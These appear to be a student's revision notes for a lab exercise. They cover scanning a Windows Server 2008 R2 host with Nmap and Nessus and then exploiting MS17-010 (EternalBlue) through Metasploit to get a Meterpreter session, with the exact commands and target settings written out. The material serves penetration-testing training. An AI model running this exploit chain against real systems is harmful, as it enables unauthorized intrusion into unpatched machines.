# Exercise 2 -- Exploiting Windows OS Vulnerability (Revision Notes)

## Objective

-   Discover live hosts
-   Enumerate target
-   Find vulnerabilities with Nessus
-   Verify vulnerability with Metasploit scanner
-   Exploit (lab only)

## Workflow

``` text
Nmap Host Discovery
        ↓
Nmap Enumeration
        ↓
Nessus Vulnerability Scan
        ↓
Metasploit Auxiliary Scanner (Verify)
        ↓
Metasploit Exploit
        ↓
Meterpreter Session
```

## Step 1 -- Host Discovery

``` bash
nmap -sn 172.19.19.1-255
```

Purpose: Find live hosts.

## Step 2 -- Enumeration

``` bash
nmap -T4 -A 172.19.19.15
```

Find: - Open ports - Services - OS - Versions

Important: - Port 445 = SMB - Target = Windows Server 2008 R2

## Step 3 -- Nessus

Purpose: - Find vulnerabilities - Missing patches - CVEs - Risk level -
CVSS

Target:

    172.19.19.15

Important settings: - Ping Remote Host = OFF - Verify Open TCP Ports =
ON - Brute Force = Only use provided credentials - Web Applications =
OFF - Windows -\> Request SMB Domain Information = ON - Advanced: - Max
Hosts = 100 - TCP Sessions = Unlimited

Result: - MS17-010 (Critical) - CVSS ≈ 9.8

## Nessus vs Nmap

Nmap: - Host discovery - Ports - OS - Services

Nessus: - Vulnerabilities - CVEs - Severity - Missing patches - Fix
recommendations

## Step 4 -- Verify Vulnerability

``` bash
msfconsole
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 172.19.19.15
run
```

If vulnerable:

    Host is likely VULNERABLE

Reason: Verify Nessus finding before exploitation.

## Step 5 -- Search Exploit

``` bash
search eternalblue
```

or

``` bash
search ms17_010
```

Reason: Find exploit module.

## Step 6 -- Select Exploit

``` bash
use exploit/windows/smb/ms17_010_eternalblue
```

## Step 7 -- Show Options

``` bash
show options
```

Purpose: View required parameters.

## Step 8 -- Configure

``` bash
set RHOSTS 172.19.19.15
set LHOST 172.19.19.18
```

RHOSTS = Target LHOST = Attacker (Parrot) IP

## Final

``` bash
exploit
```

Success: - Meterpreter session opened.

## Interview One-Liners

-   Nmap = Information Gathering
-   Nessus = Vulnerability Assessment
-   Metasploit Auxiliary = Verification
-   Metasploit Exploit = Exploitation

RHOSTS = Target IP

LHOST = Local attacker IP

MS17-010 = Microsoft vulnerability

EternalBlue = Exploit name

CVE = Vulnerability ID

CVSS = Severity score
